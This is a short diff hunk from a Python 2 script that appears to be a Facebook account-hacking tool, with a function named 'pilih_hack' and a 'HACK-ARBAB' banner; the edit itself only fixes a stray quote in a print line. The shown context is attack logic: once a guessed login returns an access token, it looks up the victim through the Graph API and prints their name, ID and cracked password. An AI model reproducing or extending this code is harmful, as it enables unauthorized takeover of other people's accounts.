@@ -901,7 +901,7 @@ def pilih_hack():
 			                                                                                   if 'access_token' in q:		
 										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                                   z = json.loads(x.text)
-				                                                                                   print '\x1b[1;92m[  ✓  ] \x1b[1;92mHACK-ARBAB💉''											
+				                                                                                   print '\x1b[1;92m[  ✓  ] \x1b[1;92mHACK-ARBAB💉'											
 				                                                                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
 				                                                                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
 				                                                                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
